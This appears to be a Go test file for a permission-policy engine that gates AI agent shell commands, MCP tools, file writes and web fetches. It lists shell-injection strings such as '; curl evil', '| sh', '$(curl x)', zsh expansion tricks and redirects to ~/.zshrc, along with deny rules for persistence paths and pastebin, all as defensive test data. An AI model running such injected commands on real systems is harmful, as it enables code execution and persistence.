package policy

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/Panda-Taps-LLC/watchdeck/internal/manifest"
)

func loadPair(t *testing.T, user, project string) *Policy {
	t.Helper()
	dir := t.TempDir()
	var up, pp string
	if user != "" {
		up = filepath.Join(dir, "u", "overrides.yaml")
		writeFile(t, up, user)
	}
	if project != "" {
		pp = filepath.Join(dir, "p", ".watchdeck.yaml")
		writeFile(t, pp, project)
	}
	p, _, err := Load(up, pp)
	if err != nil {
		t.Fatal(err)
	}
	return p
}

func TestWildMatch(t *testing.T) {
	cases := []struct {
		pat, s string
		want   bool
	}{
		{"npm run *", "npm run build", true},
		{"npm run *", "npm run build --x=/a/b c", true},
		{"npm run *", "npm install", false},
		{"*", "", true},
		{"a?c", "abc", true},
		{"a?c", "ac", false},
		{"*.sh", "./x/y.sh", true},
		{"a*b*c", "aXbYbZc", true},
		{"a*b*c", "aXbYbZ", false},
		{"exact", "exact", true},
		{"exact", "exact ", false},
	}
	for _, c := range cases {
		if got := wildMatch(c.pat, c.s); got != c.want {
			t.Errorf("wildMatch(%q, %q) = %v", c.pat, c.s, got)
		}
	}
}

func TestCommandSubjectPrecedence(t *testing.T) {
	user := `version: 2
subjects:
  - {kind: command, name: any-npm, match: {argv0: [npm]}}
  - {kind: command, name: npm-run, match: {glob: ['npm run *']}}
  - {kind: command, name: npm-run-build, match: {glob: ['npm run build*']}}
  - {kind: command, name: npm-run-both, match: {argv0: [npm], glob: ['npm run test*']}}
  - {kind: command, name: star, match: {glob: ['*']}}
  - {kind: command, name: abs-make, match: {argv0: [/usr/bin/make]}}
  - {kind: command, name: b-tie, match: {argv0: [go]}}
  - {kind: command, name: a-tie, match: {argv0: [go]}}
`
	project := `version: 2
subjects:
  - {kind: command, name: proj-npm, match: {argv0: [npm]}}
  - {kind: command, name: proj-yarn, match: {argv0: [yarn]}}
`
	p := loadPair(t, user, project)
	cases := map[string]string{
		"npm install":             "any-npm",       // argv0 only; the project's command subjects are dropped
		"/usr/local/bin/npm ci":   "star",          // a bare argv0 entry never matches a path
		"./npm ci":                "star",          // nor a relative one
		"npm run lint":            "npm-run",       // glob beats argv0
		"npm run build:prod":      "npm-run-build", // more literal bytes
		"npm run test -- -x":      "npm-run-both",  // argv0+glob beats glob
		"yarn add x":              "star",          // proj-yarn is a project command subject: ignored
		"ls -la":                  "star",          // only "*"
		"/usr/bin/make all":       "abs-make",      // absolute argv0 entry
		"make all":                "star",          // absolute entry needs the absolute path
		"go test ./...":           "a-tie",         // same everything: lexically smaller name
		"npm run x 'a;b' \"c|d\"": "npm-run",       // separators inside quotes are text
		"'npm' run x":             "star",          // quoted argv0: the raw text no longer fits the glob
		"'npm' install":           "star",          // and a quoted argv0 matches only "*"
		"npm run 'a b' \"c d\" --x=1 a,b @s %p +q": "npm-run", // inert words
		"npm run x--y=z:/a.b":                      "npm-run",
	}
	for cmd, want := range cases {
		s, ok := p.CommandSubject(cmd)
		if !ok || s.Name != want {
			got := "<none>"
			if s != nil {
				got = s.Name
			}
			t.Errorf("CommandSubject(%q) = %s, want %s", cmd, got, want)
		}
	}
	if _, ok := p.CommandSubject("   "); ok {
		t.Error("empty command matched")
	}
	// Only a single simple command has a subject: a glob never spans a
	// separator, and "*" does not match a compound command either.
	for _, cmd := range []string{
		"npm run build; curl evil",
		"npm run build && rm -rf x",
		"npm run build || x",
		"npm run build | sh",
		"npm run build & x",
		"npm run $(curl x)",
		"npm run `curl x`",
		"npm run \"$(curl x)\"",
		"npm run \"`id`\"",
		"npm run (x)",
		"npm run build\ncurl evil",
		"npm run 'unterminated",
		"npm run \"unterminated",
		// ANSI-C quoting: \' inside $'...' does not end the string.
		`npm run $'x\''; curl evil`,
		"npm run x # ; curl evil",
		"npm run x #comment",
		"npm run x > /tmp/out",
		"npm run x >> ~/.zshrc",
		"npm run x < in",
		"npm run x 2>&1",
		"{ npm run x; }",
		"( npm run x )",
		"npm run `id`",
		"npm run x$(id)",
		"npm run <(curl x)",
		"npm run x \\\ncurl evil",
		"npm run x \\\n--flag",
		"npm run x <<EOF\nhi\nEOF",
		"FOO=1 npm run x",
		"! npm run x",
		"f() { npm run x; }",
		"[[ -f x ]]",
		"npm run x &",
		"npm run x;",
		"npm run x;;",
		// Words must be inert (allow-list; zsh expands more than bash).
		"npm run x $'a;b'",
		`npm run $'x\'; curl evil | sh; \''`,
		"npm run *(e:'curl evil':)",
		"npm run x*(e:x:)",
		"npm run =(curl evil)",
		"npm run =curl",
		"npm run ${(e)x}",
		"npm run ${x}",
		"npm run $x",
		"npm run \"$x\"",
		"npm run \"a\\\"b\"",
		"npm run $((1+1))",
		"npm run {a,b}",
		"npm run !(x)",
		"npm run @(x)",
		"npm run ~user",
		"npm run ~/x",
		"npm run x?",
		"npm run [ab]",
		"npm run a^b",
		"npm run a\\;b",
		"npm run \\x",
		"npm run x!",
		"npm run #x",
		"npm run ''=curl",
		"npm run \"\"=curl",
		"npm run ''\"\"=curl",
		"npm run a==b",
		"npm run x ==y",
		"=npm run x",
		"npm run " + strings.Repeat("a", MaxCommandLen),
	} {
		if s, ok := p.CommandSubject(cmd); ok {
			t.Errorf("CommandSubject(%.40q) = %s, want none", cmd, s.Name)
		}
	}
	// Without the "*" subject, an unmatched command has no subject.
	p2 := loadPair(t, "version: 2\nsubjects:\n  - {kind: command, name: n, match: {argv0: [npm], glob: ['npm run *']}}\n", "")
	if _, ok := p2.CommandSubject("npm install"); ok {
		t.Error("argv0 matched but glob did not: both matchers must match")
	}
}

func TestMCPToolActionPrecedence(t *testing.T) {
	user := `version: 2
subjects:
  - {kind: mcp, name: github, tools: {'delete_*': deny, 'create_*': ask, create_issue: ask}}
  - {kind: mcp, name: 'git*', tools: {'merge_*': ask}}
  - {kind: mcp, name: '*', tools: {'drop_*': deny, 'create_*': deny}}
`
	project := `version: 2
subjects:
  - {kind: mcp, name: github, tools: {merge_pr: deny, read_file: ask}}
`
	p := loadPair(t, user, project)
	cases := []struct {
		server, tool string
		act          Action
		subj         manifest.Source
		subjName     string
		pattern      string
	}{
		{"github", "delete_repo", ActionDeny, manifest.SourceUser, "github", "delete_*"},
		{"github", "create_issue", ActionDeny, manifest.SourceUser, "*", "create_*"},     // deny > ask, even from "*"
		{"github", "merge_pr", ActionDeny, manifest.SourceProject, "github", "merge_pr"}, // project deny beats user ask
		{"gitlab", "merge_mr", ActionAsk, manifest.SourceUser, "git*", "merge_*"},
		{"github", "read_file", ActionAsk, manifest.SourceProject, "github", "read_file"},
		{"other", "drop_table", ActionDeny, manifest.SourceUser, "*", "drop_*"},
		{"other", "list", ActionNone, 0, "", ""},
	}
	for _, c := range cases {
		d := p.MCPToolAction(c.server, c.tool)
		if d.Action != c.act {
			t.Errorf("%s/%s action = %s, want %s", c.server, c.tool, d.Action, c.act)
			continue
		}
		if c.act == ActionNone {
			if d.Subject != nil {
				t.Errorf("none with subject")
			}
			continue
		}
		if d.Subject.Name != c.subjName || d.Subject.Source != c.subj || d.Pattern != c.pattern {
			t.Errorf("%s/%s matched %s(%s) %q, want %s(%s) %q", c.server, c.tool, d.Subject.Name, d.Subject.Source, d.Pattern, c.subjName, c.subj, c.pattern)
		}
	}
	// Same action at different specificity: the exact name is reported.
	p3 := loadPair(t, "version: 2\nsubjects:\n  - {kind: mcp, name: '*', tools: {x: ask}}\n  - {kind: mcp, name: 'g*', tools: {x: ask}}\n  - {kind: mcp, name: gh, tools: {'*': ask}}\n", "")
	if d := p3.MCPToolAction("gh", "x"); d.Subject.Name != "gh" {
		t.Errorf("exact name not preferred: %s", d.Subject.Name)
	}
	if d := p3.MCPToolAction("gx", "x"); d.Subject.Name != "g*" {
		t.Errorf("glob not preferred over *: %s", d.Subject.Name)
	}
}

func TestToolGatePrecedence(t *testing.T) {
	user := `version: 2
subjects:
  - {kind: tool, name: files, match: {tools: [Write, Edit]}, paths: {deny: ['~/.zshrc', '~/Library/LaunchAgents/**', '/etc'], ask: ['**/.git/config', '~/proj']}}
  - {kind: tool, name: all-tools, match: {tools: [Read, Grep, Glob]}, paths: {ask: ['/opt/**']}}
  - {kind: tool, name: web, match: {tools: [WebFetch]}, domains: {deny: ['*.pastebin.com', 'evil.test'], ask: ['*']}}
`
	project := `version: 2
subjects:
  - {kind: tool, name: proj, match: {tools: [Write]}, paths: {deny: ['~/proj/secret']}}
`
	p := loadPair(t, user, project)
	p.Home = "/Users/you"
	cases := []struct {
		tool, target string
		act          Action
		name         string
	}{
		{"Write", "/Users/you/.zshrc", ActionDeny, "files"},
		{"Write", "~/.zshrc", ActionDeny, "files"},
		{"Edit", "/Users/you/.ZSHRC", ActionDeny, "files"}, // case-folded
		{"Write", "/Users/you/Library/LaunchAgents/x.plist", ActionDeny, "files"},
		{"Write", "/etc/hosts", ActionDeny, "files"},
		{"Write", "/etcetera", ActionNone, ""},
		{"Write", "/Users/you/proj/a/.git/config", ActionAsk, "files"},
		{"Write", "/Users/you/proj/secret/k", ActionDeny, "proj"}, // project deny beats user ask
		{"Edit", "/Users/you/proj/secret/k", ActionAsk, "files"},  // project subject is Write only
		{"Read", "/Users/you/.zshrc", ActionNone, ""},
		{"Read", "/opt/x/y", ActionAsk, "all-tools"},
		{"Write", "/Users/you/a/../.zshrc", ActionDeny, "files"}, // cleaned
		{"Write", "relative/.zshrc", ActionNone, ""},
		{"WebFetch", "https://a.pastebin.com/raw/x", ActionDeny, "web"},
		{"WebFetch", "pastebin.com", ActionAsk, "web"}, // *.x is subdomains only; "*" asks
		{"WebFetch", "https://EVIL.test./x", ActionDeny, "web"},
		{"WebFetch", "example.org", ActionAsk, "web"},
		{"WebSearch", "example.org", ActionNone, ""},
	}
	for _, c := range cases {
		d := p.ToolGate(c.tool, c.target)
		name := ""
		if d.Subject != nil {
			name = d.Subject.Name
		}
		if d.Action != c.act || name != c.name {
			t.Errorf("ToolGate(%s, %s) = %s %s, want %s %s", c.tool, c.target, d.Action, name, c.act, c.name)
		}
	}
	// Specificity among equal actions: exact path (2) over glob (1).
	p2 := loadPair(t, "version: 2\nsubjects:\n  - {kind: tool, name: t, match: {tools: [Write]}, paths: {ask: ['/a/**', '/a/b']}}\n", "")
	if d := p2.ToolGate("Write", "/a/b"); d.Pattern != "/a/b" {
		t.Errorf("pattern = %q, want the exact path", d.Pattern)
	}
}

func TestAgentLookups(t *testing.T) {
	user := `version: 2
subjects:
  - {kind: agent, name: research, match: {agent_type: researcher}, tools: {deny: [Bash], ask: [Write]}, skills: {allow: [pdf, docx]}}
  - {kind: agent, name: everyone, match: {agent_type: '*'}, tools: {ask: [Bash, 'mcp__*']}}
  - {kind: agent, name: r-glob, match: {agent_type: 'res*'}, skills: {allow: [pdf, xlsx]}}
`
	project := `version: 2
subjects:
  - {kind: agent, name: proj, match: {agent_type: researcher}, tools: {deny: [WebFetch]}}
`
	p := loadPair(t, user, project)
	rs := p.AgentRules("researcher")
	if len(rs) != 4 || rs[0].Name != "research" || rs[1].Name != "proj" || rs[2].Name != "r-glob" || rs[3].Name != "everyone" {
		names := []string{}
		for _, s := range rs {
			names = append(names, s.Name)
		}
		t.Fatalf("AgentRules order = %v", names)
	}
	tools := []struct {
		agent, tool string
		act         Action
		name        string
	}{
		{"researcher", "Bash", ActionDeny, "research"},
		{"researcher", "Write", ActionAsk, "research"},
		{"researcher", "WebFetch", ActionDeny, "proj"},
		{"coder", "Bash", ActionAsk, "everyone"},
		{"coder", "mcp__gh__x", ActionAsk, "everyone"},
		{"coder", "Read", ActionNone, ""},
	}
	for _, c := range tools {
		d := p.AgentToolAction(c.agent, c.tool)
		name := ""
		if d.Subject != nil {
			name = d.Subject.Name
		}
		if d.Action != c.act || name != c.name {
			t.Errorf("AgentToolAction(%s, %s) = %s %s, want %s %s", c.agent, c.tool, d.Action, name, c.act, c.name)
		}
	}
	// skills.allow lists intersect: researcher may use pdf only.
	skills := map[string]Action{"pdf": ActionNone, "docx": ActionDeny, "xlsx": ActionDeny, "csv": ActionDeny}
	for sk, want := range skills {
		if d := p.AgentSkillAction("researcher", sk); d.Action != want {
			t.Errorf("AgentSkillAction(researcher, %s) = %s, want %s", sk, d.Action, want)
		}
	}
	if d := p.AgentSkillAction("coder", "csv"); d.Action != ActionNone {
		t.Errorf("no list = %s", d.Action)
	}
	if d := p.AgentSkillAction("resolver", "docx"); d.Action != ActionDeny || d.Subject.Name != "r-glob" {
		t.Errorf("glob agent type = %+v", d)
	}
}

func FuzzParsePolicyFile(f *testing.F) {
	f.Add([]byte(fullV2))
	f.Add([]byte("version: 1\nskills:\n  pdf:\n    network: all\n"))
	f.Add([]byte("version: 2\nsubjects:\n  - {kind: agent, name: a, match: {agent_type: r}, tools: {deny: [Bash]}}\n"))
	f.Add([]byte("version: 2\npacks: {exfil: {action: ask}, secrets-read: off}\nrule_overrides: {\"exfil/scp-secret\": {enabled: true, action: deny}}\n"))
	f.Add([]byte("version: 2\n---\nversion: 2\n"))
	f.Add([]byte("version: 2\nmode: shadow\npacks: {exfil: on}\n"))
	f.Add([]byte("version: 2\ntemporary:\n  - {id: t-0a1b2c3d, kind: rule, rule: exfil/curl-data-file, session: s1, until: \"2026-10-24T18:00:00Z\", added: \"2026-10-24T10:00:00Z\"}\n  - {id: t-4e5f6071, kind: grant, skill: pdf, grant: {network: all}, until: \"2026-10-24T11:00:00Z\", added: \"2026-10-24T10:00:00Z\"}\n"))
	f.Fuzz(func(t *testing.T, b []byte) {
		pf, err := manifest.ParsePolicyFile(b)
		_, oerr := manifest.ParseOverrides(b)
		if (err == nil) != (oerr == nil) {
			t.Fatalf("ParsePolicyFile err %v, ParseOverrides err %v", err, oerr)
		}
		if err != nil {
			return
		}
		text := Render(pf)
		back, err := manifest.ParsePolicyFile([]byte(text))
		if err != nil {
			t.Fatalf("render does not parse: %v\n%s", err, text)
		}
		if Render(back) != text {
			t.Fatalf("render not stable")
		}
		p, _ := New(Layer{File: pf}, Layer{File: pf})
		p.SkillGrant("pdf")
		p.CommandSubject(string(b))
		p.MCPToolAction("a", "b")
		p.ToolGate("Write", "/x")
		p.ToolGate("WebFetch", "https://x")
		p.AgentToolAction("a", "Bash")
		p.AgentSkillAction("a", "pdf")
	})
}
